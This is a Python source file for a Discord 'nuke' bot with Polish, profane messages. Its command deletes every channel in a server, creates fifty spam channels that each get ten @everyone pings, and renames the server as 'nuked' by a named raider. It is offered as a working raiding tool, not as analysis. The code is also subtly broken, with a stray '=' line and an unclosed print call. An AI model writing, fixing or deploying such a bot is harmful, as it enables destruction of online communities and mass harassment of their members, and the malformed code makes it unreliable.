import discord
from discord.ext import commands
import asyncio
import logging

logging.basicConfig(level=logging.INFO, format='%(asctime)s - %(levelname)s - %(message)s')
logger = logging.getLogger(__name__)
=
TOKEN = 'TOKEN BOTA'
intents = discord.Intents.all()
bot = commands.Bot(command_prefix='.', intents=intents)

@bot.event
async def on_ready():
    print(f'Logged in as {bot.user} (ID: {bot.user.id})')
    print('------')

@bot.command(name='nuke')
@commands.has_permissions(administrator=True)
async def nuke_server(ctx):
    """Nuke the server (requires admin permissions)."""
    guild = ctx.guild

    embed = discord.Embed(
        title="⚠️ **UWAGA KURWA BEDZIE BOMBA** ⚠️",
        description="Bedzie totalny **ROZPIERDOL** Wpisz `POTWIERDZAM` zeby przejsc dalej.",
        color=discord.Color.red()
    )
    warning_msg = await ctx.send(embed=embed)

    def check(m):
        return m.author == ctx.author and m.content.upper() == 'POTWIERDZAM'

    try:
        await bot.wait_for('message', check=check, timeout=30.0)
    except asyncio.TimeoutError:
        await warning_msg.edit(embed=discord.Embed(
            title="Tym razem macie farta",
            description="GG dla nukea",
            color=discord.Color.greyple()
        ))
        return

    await warning_msg.edit(embed=discord.Embed(
        title="NUKE ODPALONY KURWA",
        description="ROZPIERDOL...",
        color=discord.Color.red()
    ))


    for channel in list(guild.channels):
        try:
            await channel.delete()
            print(f"Usunieto: {channel.name}")
        except Exception as e:
            print(f"nie usunieto {channel.name}: {e}"

    spam_tasks = []
    for i in range(50):
        try:
            channel = await guild.create_text_channel(f"Nuked by SigmJan8-{i}")
            print(f"Created spam channel: {channel.name}")
            for _ in range(10):
                spam_tasks.append(channel.send("@everyone **SERVER NUKED BY SigmaJan8** 💥"))
        except Exception as e:
            print(f"Nie udalo sie utworzyc: {e}")
    await asyncio.gather(*spam_tasks, return_exceptions=True)

    try:
        await guild.edit(name="NUKED BY SigmaJan8")
    except Exception as e:
        print(f"Nie zmieniono nazwy serwera: {e}")

    await ctx.send("Rozpierdol udany.")

bot.run(TOKEN)

